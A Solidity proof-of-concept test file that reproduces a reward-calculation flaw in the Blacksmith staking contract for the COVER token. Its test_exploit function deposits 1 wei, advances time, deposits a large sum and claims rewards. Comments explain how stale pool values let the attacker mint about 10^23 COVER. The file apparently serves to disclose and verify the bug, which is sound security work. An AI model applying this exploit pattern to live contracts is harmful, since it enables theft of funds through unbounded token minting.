// SPDX-License-Identifier: None
pragma solidity ^0.7.4;

import "ds-test/test.sol";
import "ds-token/token.sol";

import "./Blacksmith.sol";
import "./COVER.sol";

interface Hevm {
    function warp(uint256) external;
}

contract Guy {
    function approve(DSToken token, address addr) external {
        token.approve(addr);
    }
    function deposit(Blacksmith bs, address lpToken, uint256 amount) external {
        bs.deposit(lpToken, amount);
    }
    function withdraw(Blacksmith bs, address lpToken, uint256 amount) external {
        bs.withdraw(lpToken, amount);
    }
    function claimRewards(Blacksmith bs, address lpToken) external {
        bs.claimRewards(lpToken);
    }
}

contract DhCover20201228Test is DSTest {

    // CHEAT_CODE = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
    bytes20 constant CHEAT_CODE =
        bytes20(uint160(uint256(keccak256('hevm cheat code'))));

    Hevm hevm;

    COVER coverToken;
    Blacksmith blacksmith;
    DSToken lpToken;

    function setUp() public {
        hevm = Hevm(address(CHEAT_CODE));

        coverToken = new COVER();
        address governance = address(this);
        address treasury = address(0x1);
        blacksmith = new Blacksmith(address(coverToken), governance, treasury);
        hevm.warp(1605830400);  // 11/20/2020 12am UTC
        coverToken.release(treasury, address(0x2), address(blacksmith), address(0x3));

        lpToken = new DSToken("LPTOKEN");
        blacksmith.addPool(address(lpToken), 100);

        // nice round number for weekly rewards (100 per day)
        blacksmith.updateWeeklyTotal(700 * 10**18);
    }

    function test_exploit() public {
        Guy bob = new Guy();

        uint256 AMT = 1000 * 10**18;
        lpToken.mint(address(bob), AMT);
        bob.approve(lpToken, address(blacksmith));

        bob.deposit(blacksmith, address(lpToken), 1);

        // go 1 day into the future
        hevm.warp(block.timestamp + 1 days);

        // In this call, we update pool.accRewardsPerToken to (100 ether) * 10^12 / 1.
        // (100 COVER per wei of LP tokens)
        // Due to not using updated pool values to calculate bob's rewards, however,
        // Bob receives zero rewards and thus his rewardWriteoff is zero instead of (100 ether).
        // This means Bob is still eligible to claim his accumulated rewards from the past day.
        // Bob's staked amount is increased to AMT = 1000 * 10**18.
        bob.deposit(blacksmith, address(lpToken), AMT - 1);

        // This grants Bob (AMT * pool.accRewardsPerToken / 10^12 - rewardWriteoff) COVER.
        // This essentially grants him COVER as if he had 1000 LP tokens staked for the last
        // day instead of just 1 wei (which is the value used to update pool.accRewardsPerToken).
        // Thus he receives 10^21 times (1000 / (1 wei)) more COVER than is appropriate.
        bob.claimRewards(blacksmith, address(lpToken));

        // Bob minted 10**23 COVER
        assertEq(coverToken.balanceOf(address(bob)), (10**23) * (1 ether));

        // This exceeds the "intended" daily maximum mint.
        assertGt(coverToken.balanceOf(address(bob)), blacksmith.weeklyTotal() / 7);
    }
}
